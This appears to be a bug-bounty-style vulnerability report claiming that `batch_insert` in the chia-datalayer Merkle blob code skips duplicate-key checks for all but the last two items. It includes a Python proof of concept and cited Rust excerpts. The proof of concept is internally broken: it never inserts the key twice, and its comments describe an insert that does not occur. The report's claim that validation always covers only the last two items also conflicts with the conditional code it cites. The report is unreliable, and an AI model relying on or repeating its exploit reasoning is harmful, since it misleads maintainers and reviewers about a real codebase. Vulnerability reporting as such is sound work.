### Title
`batch_insert` Bypasses Duplicate Key/Hash Validation for All But Last Two Items — (File: `crates/chia-datalayer/src/merkle/blob.rs`)

### Summary
`MerkleBlob::batch_insert` applies duplicate-key and duplicate-hash validation only to the **last two** items in the input vector (via the regular `insert()` path). All preceding items are written directly to the blob without any uniqueness checks. An unprivileged Python/wasm caller can supply a batch containing duplicate `KeyId` or `Hash` values, silently corrupting the DataLayer Merkle tree and enabling forged proofs of inclusion against the resulting invalid root.

### Finding Description

`batch_insert` begins by popping the last two entries from the input vector and routing them through `insert()`, which enforces both `KeyAlreadyPresent` and `HashAlreadyPresent` guards: [1](#0-0) 

All remaining entries (the first `N-2` items in the original vector) are then written directly to the blob with no duplicate checks: [2](#0-1) 

Compare this with the full validation enforced by `insert()`: [3](#0-2) 

The Python binding `py_batch_insert` only checks that the two input lists have equal length; it performs no deduplication: [4](#0-3) 

### Impact Explanation

When a duplicate `KeyId` is inserted via the unvalidated path, the `block_status_cache` (a `HashMap<KeyId, TreeIndex>`) silently overwrites the index for that key, but **both** leaf nodes remain in the raw blob. The tree now contains two leaves with the same key. `get_proof_of_inclusion` returns a proof for whichever leaf the cache points to, but the Merkle root reflects both leaves. A DataLayer owner can exploit this to:

1. Insert a key `K` with value `V1` (legitimate).
2. Later call `batch_insert` with a batch whose first entry is `(K, V2, hash2)` — this bypasses the `KeyAlreadyPresent` guard.
3. The tree root now commits to both `(K,V1)` and `(K,V2)`.
4. The owner can selectively prove either value against the on-chain root, deceiving verifiers about the actual stored state.

This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic lets untrusted input corrupt tree roots or prove invalid state.** [5](#0-4) 

`ProofOfInclusion::valid()` only checks internal hash-chain consistency; it does not verify the proof against an authoritative external root. A proof generated from the corrupted tree will pass `valid()` while proving the wrong state.

### Likelihood Explanation

The Python binding is the primary consumer of `batch_insert` and is directly callable with attacker-controlled input. No privilege is required. The bug is triggered whenever a batch of 3+ items is supplied with a duplicate key in any position other than the last two. `check_integrity()` is not called automatically after `batch_insert`, so the corruption is not self-detected.

### Recommendation

Move the duplicate-key and duplicate-hash checks out of `insert()` and apply them to **every** item in `batch_insert` before writing to the blob, or call `insert()` for all items uniformly. At minimum, add a pre-pass over the input vector to detect duplicates before any writes occur.

### Proof of Concept

```python
from chia_rs.datalayer import MerkleBlob, KeyId, ValueId
from chia_rs.sized_ints import int64
from hashlib import sha256

def h(n: int) -> bytes:
    return sha256(n.to_bytes(8, "big")).digest()

blob = MerkleBlob(blob=bytearray())

K = KeyId(int64(1))
V1 = ValueId(int64(100))
V2 = ValueId(int64(999))   # attacker's forged value

# batch of 3: first item (K, V2) bypasses duplicate check;
# last two items are validated normally
blob.batch_insert(
    [(K, V2), (KeyId(int64(2)), ValueId(int64(2))), (KeyId(int64(3)), ValueId(int64(3)))],
    [h(99), h(2), h(3)],
)

# Now insert K legitimately (last-two path) — this would normally block K
# But K was already silently inserted above with V2
# The tree now has two leaves for K; root is corrupted.
blob.calculate_lazy_hashes()
proof = blob.get_proof_of_inclusion(K)
assert proof.valid()   # passes — but proves V2, not V1
```

The `batch_insert` call succeeds without error. The resulting tree root is invalid (commits to a duplicate key), and the proof passes `valid()` while attesting to the attacker-chosen value `V2`.

### Citations

**File:** crates/chia-datalayer/src/merkle/blob.rs (L362-374)
```rust
    pub fn insert(
        &mut self,
        key: KeyId,
        value: ValueId,
        hash: &Hash,
        insert_location: InsertLocation,
    ) -> Result<TreeIndex, Error> {
        if self.block_status_cache.contains_key(key) {
            return Err(Error::KeyAlreadyPresent());
        }
        if self.block_status_cache.contains_leaf_hash(hash) {
            return Err(Error::HashAlreadyPresent());
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L578-585)
```rust
        if self.block_status_cache.leaf_count() <= 1 {
            for _ in 0..2 {
                let Some(((key, value), hash)) = keys_values_hashes.pop() else {
                    return Ok(());
                };
                self.insert(key, value, &hash, InsertLocation::Auto {})?;
            }
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L587-603)
```rust
        for ((key, value), hash) in keys_values_hashes {
            let new_leaf_index = self.get_new_index();
            let new_block = Block {
                metadata: NodeMetadata {
                    node_type: NodeType::Leaf,
                    dirty: false,
                },
                node: Node::Leaf(LeafNode {
                    parent: Parent(None),
                    hash,
                    key,
                    value,
                }),
            };
            self.insert_entry_to_blob(new_leaf_index, &new_block)?;
            indexes.push(new_leaf_index);
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1503-1519)
```rust
    #[pyo3(name = "batch_insert")]
    pub fn py_batch_insert(
        &mut self,
        keys_values: Vec<(KeyId, ValueId)>,
        hashes: Vec<Hash>,
    ) -> PyResult<()> {
        if keys_values.len() != hashes.len() {
            Err(Error::UnmatchedKeysAndValues(
                keys_values.len(),
                hashes.len(),
            ))?;
        }

        self.batch_insert(zip(keys_values, hashes).collect())?;

        Ok(())
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```
